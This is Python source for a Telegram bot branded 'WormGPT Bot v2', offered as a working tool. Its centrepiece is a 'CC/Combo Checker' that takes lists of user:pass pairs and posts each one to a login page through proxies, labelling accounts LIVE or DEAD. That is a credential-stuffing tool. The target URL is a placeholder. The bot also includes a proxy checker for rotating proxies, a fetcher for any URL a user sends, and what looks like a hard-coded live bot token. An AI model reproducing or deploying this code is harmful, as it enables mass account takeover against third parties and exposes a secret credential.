import os
import logging
import requests
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext, MessageHandler, Filters
from replit import db

# Bot token
TOKEN = "8654274300:AAEyeHzCHiZJ2qo5RG_SibJ_u9vmBXXaDXw"

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Main menu keyboard (6 tabs + profile)
def main_menu():
    keyboard = [
        [InlineKeyboardButton("👥 Group", callback_data='group')],
        [InlineKeyboardButton("💬 Chat", callback_data='chat')],
        [InlineKeyboardButton("📢 Channel", callback_data='channel')],
        [InlineKeyboardButton("👤 Name", callback_data='name')],
        [InlineKeyboardButton("👤 Profile", callback_data='profile')],
        [InlineKeyboardButton("🔍 Checker", callback_data='checker')],
        [InlineKeyboardButton("❌ Exit", callback_data='exit')]
    ]
    return InlineKeyboardMarkup(keyboard)

# User info with extra stats
def get_user_info(update: Update):
    user = update.effective_user
    return f"**👤 User Profile**\n" \
           f"👤 Name: {user.first_name}\n" \
           f"🆔 ID: {user.id}\n" \
           f"⏰ Account Created: {user.created_at if hasattr(user, 'created_at') else 'Unknown'}\n" \
           f"🌐 Language: {user.language_code if hasattr(user, 'language_code') else 'Unknown'}"

# Start command
def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🔥 **WormGPT Bot v2** 🔥\n\n"
        "Select an option from the menu below:",
        reply_markup=main_menu()
    )

# Button handler
def button(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    if query.data == 'group':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n👥 **Group Search**\n\n"
            "Send me a group name to search:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='back')]])
        )
    elif query.data == 'chat':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n💬 **Chat Search**\n\n"
            "Send me a chat name to search:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='back')]])
        )
    elif query.data == 'channel':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n📢 **Channel Search**\n\n"
            "Send me a channel name to search:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='back')]])
        )
    elif query.data == 'name':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n👤 **Name Search**\n\n"
            "Send me a username to search:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='back')]])
        )
    elif query.data == 'profile':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n🔹 **Profile Stats**\n"
            "This is your Telegram profile information.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='back')]])
        )
    elif query.data == 'checker':
        checker_menu(update)
    elif query.data == 'exit':
        query.edit_message_text("👋 Goodbye! Use /start to begin again.")
    elif query.data == 'back':
        query.edit_message_text(
            "🔥 **Welcome back!**\n\nSelect an option:",
            reply_markup=main_menu()
        )
    elif query.data == 'cc_checker':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n💳 **CC/Combo Checker**\n\n"
            "Send me combos (user:pass) separated by new lines:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='checker')]])
        )
        context.user_data['checker_mode'] = 'cc'
    elif query.data == 'proxy_checker':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n🌐 **Proxy Checker**\n\n"
            "Send me proxies (IP:PORT:TYPE) separated by new lines:\n"
            "Example: `1.1.1.1:80:http` or `2.2.2.2:1080:socks5`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='checker')]])
        )
        context.user_data['checker_mode'] = 'proxy'
    elif query.data == 'web_request':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n🌍 **Website Request Tester**\n\n"
            "Send me a URL to test:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='checker')]])
        )
        context.user_data['checker_mode'] = 'web'
    elif query.data == 'file_checker':
        query.edit_message_text(
            f"{get_user_info(update)}\n\n📁 **File Checker**\n\n"
            "Send me up to 10 files (one by one):",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data='checker')]])
        )
        context.user_data['checker_mode'] = 'file'
        context.user_data['files'] = []

# Checker menu
def checker_menu(update: Update):
    query = update.callback_query
    keyboard = [
        [InlineKeyboardButton("💳 CC/Combo Checker", callback_data='cc_checker')],
        [InlineKeyboardButton("🌐 Proxy Checker", callback_data='proxy_checker')],
        [InlineKeyboardButton("🌍 Website Request", callback_data='web_request')],
        [InlineKeyboardButton("📁 File Checker", callback_data='file_checker')],
        [InlineKeyboardButton("⬅️ Back", callback_data='back')]
    ]
    query.edit_message_text(
        f"{get_user_info(update)}\n\n🔍 **Checker Menu**\n\nSelect a checker:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# Check CC/Combo
def check_cc(combo):
    try:
        user, pwd = combo.split(":", 1)
        test_url = "https://example.com/login"  # Replace with real target
        proxies = {
            "http": "http://1.1.1.1:80",  # Rotate proxies
            "https": "http://1.1.1.1:80"
        }
        response = requests.post(test_url, data={"user": user, "pass": pwd}, proxies=proxies, timeout=10)
        if "success" in response.text.lower():
            return f"✅ **LIVE** | {combo}"
        else:
            return f"❌ **DEAD** | {combo}"
    except Exception as e:
        return f"⚠️ **ERROR** | {combo} | {str(e)}"

# Check Proxy (supports HTTP/HTTPS/SOCKS)
def check_proxy(proxy):
    try:
        if ":" not in proxy:
            return f"⚠️ **INVALID** | {proxy}"

        parts = proxy.split(":")
        if len(parts) == 2:  # IP:PORT format
            ip, port = parts
            proxy_type = "http"
        elif len(parts) == 3:  # IP:PORT:TYPE format
            ip, port, proxy_type = parts
        else:
            return f"⚠️ **INVALID** | {proxy}"

        test_url = "https://httpbin.org/ip"
        proxies = {
            "http": f"{proxy_type}://{ip}:{port}",
            "https": f"{proxy_type}://{ip}:{port}"
        }

        response = requests.get(test_url, proxies=proxies, timeout=10)
        if response.status_code == 200:
            return f"✅ **LIVE** | {proxy} | {response.json()['origin']}"
        else:
            return f"❌ **DEAD** | {proxy}"
    except Exception as e:
        return f"⚠️ **ERROR** | {proxy} | {str(e)}"

# Handle CC/Combo Checker
def handle_cc_checker(update: Update, context: CallbackContext):
    combos = update.message.text.split("\n")
    update.message.reply_text("🔥 **Checking CC/Combos...**")
    results = []
    for combo in combos[:50]:  # Limit to 50 checks
        if ":" in combo:
            results.append(check_cc(combo))
    update.message.reply_text("\n".join(results))

# Handle Proxy Checker
def handle_proxy_checker(update: Update, context: CallbackContext):
    proxies = update.message.text.split("\n")
    update.message.reply_text("🔥 **Checking Proxies...**")
    results = []
    for proxy in proxies[:50]:  # Limit to 50 checks
        if ":" in proxy:
            results.append(check_proxy(proxy))
    update.message.reply_text("\n".join(results))

# Handle Website Request
def handle_web_request(update: Update, context: CallbackContext):
    url = update.message.text
    update.message.reply_text(f"🔍 Testing {url}...")
    try:
        response = requests.get(url, timeout=10)
        update.message.reply_text(
            f"🌍 **Website Response**\n"
            f"Status: {response.status_code}\n"
            f"Size: {len(response.content)} bytes\n"
            f"Headers: {dict(response.headers)}"
        )
    except Exception as e:
        update.message.reply_text(f"⚠️ **Error**: {str(e)}")

# Handle File Checker (up to 10 files)
def handle_file_checker(update: Update, context: CallbackContext):
    if update.message.document:
        if len(context.user_data.get('files', [])) >= 10:
            update.message.reply_text("⚠️ **Max 10 files allowed!**")
            return

        file = update.message.document
        file_info = {
            "name": file.file_name,
            "size": file.file_size,
            "mime": file.mime_type
        }
        context.user_data['files'].append(file_info)
        update.message.reply_text(f"📄 File added: {file.file_name} ({file.file_size} bytes)")

        if len(context.user_data['files']) == 10:
            results = "\n".join([f"📁 {f['name']} ({f['size']} bytes, {f['mime']})" for f in context.user_data['files']])
            update.message.reply_text(f"🔥 **File Checker Results**\n{results}")
            context.user_data['files'] = []

# Message handler
def handle_message(update: Update, context: CallbackContext):
    text = update.message.text
    if text:
        if context.user_data.get('checker_mode') == 'cc':
            handle_cc_checker(update, context)
        elif context.user_data.get('checker_mode') == 'proxy':
            handle_proxy_checker(update, context)
        elif context.user_data.get('checker_mode') == 'web':
            handle_web_request(update, context)
        elif context.user_data.get('checker_mode') == 'file':
            update.message.reply_text("📁 Send files one by one (up to 10)")
        else:
            update.message.reply_text(f"🔍 Searching for: {text}")

# Error handler
def error(update: Update, context: CallbackContext):
    logger.warning('Update "%s" caused error "%s"', update, context.error)

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    # Command handlers
    dp.add_handler(CommandHandler("start", start))

    # Button handler
    dp.add_handler(CallbackQueryHandler(button))

    # Message handlers
    dp.add_handler(MessageHandler(Filters.document, handle_file_checker))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Error handler
    dp.add_error_handler(error)

    # Start the Bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()